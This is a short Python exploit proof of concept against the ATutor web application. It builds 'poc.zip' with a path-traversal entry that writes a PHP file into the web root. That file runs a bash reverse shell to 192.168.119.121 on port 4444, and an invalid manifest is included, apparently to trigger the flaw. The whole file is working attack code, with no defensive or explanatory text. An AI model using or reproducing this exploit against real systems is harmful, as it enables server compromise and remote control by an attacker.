#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w' , zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml' , '<?php exec(\'/bin/bash -c \"bash -i >& /dev/tcp/192.168.119.121/4444 0>&1\"\'); ?>')
    z.writestr('imsmanifest.xml' , 'invalid xml')
    z.close()
    zip = open('poc.zip' , 'wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()